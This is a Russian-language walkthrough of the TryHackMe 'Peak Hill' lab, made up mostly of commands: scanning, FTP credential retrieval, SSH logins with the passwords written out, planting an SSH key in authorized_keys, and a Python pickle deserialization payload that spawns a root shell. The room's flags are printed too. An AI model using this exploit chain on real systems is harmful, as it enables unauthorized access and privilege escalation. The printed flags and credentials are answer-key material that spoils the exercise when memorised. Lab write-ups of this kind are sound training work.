

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Peak Hill](https://tryhackme.com/r/room/peakhill) 

Всего 1 заданиe:
## Задание 1
Разверните и скомпрометируйте машину!
Убедитесь, что вы подключены к  сети TryHackMe .

### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sSCV -p- <IP>
ftp <IP>
ls -la
get .creds
get test.txt
lquit
cat test.txt 
cat .creds

cyber chef -> from binary
python3 decode_pickel.py
# SSH user: gherkin
# SSH pass: p1ckl3s_@11_@r0und_th3_w0rld

ssh gherkin@<IP>
ls -la
cat cmd_service.pyc

python3
print(long_to_bytes(1684630636))
print(long_to_bytes(2457564920124666544827225107428488864802762356))

nc <IP> 7321
# Username: dill
# Password: n3v3r_@_d1ll_m0m3nt
cat /home/dill/user.txt
```
```commandline
f1e13335c47306e193212c98fc07b6a0
```
+ 50
Что такое корневой флаг?
```commandline
ssh-keygen -t rsa
cat id_rsa.pub
echo "ssh-rsa ...[REDACTED]...= unknown@localhost.localdomain" >> /home/dill/.ssh/authorized_keys
ssh dill@<IP>
sudo -l
cd /opt/peak_hill_farm
sudo ./peak_hill_farm 
pickles

python3
import sys
import pickle
import base64
import os

cmd = sys.argv[1]

class Exec(object):
    def __reduce__(self):
        return (eval("os.system"), (cmd,))

print(f"os.system(\"{cmd}\")")
print()
print(base64.b64encode(pickle.dumps(Exec())).decode())


sudo ./peak_hill_farm 
gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=

cat /root/root.txt
```
```commandline
e88f0a01135c05cf0912cf4bc335ee28
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)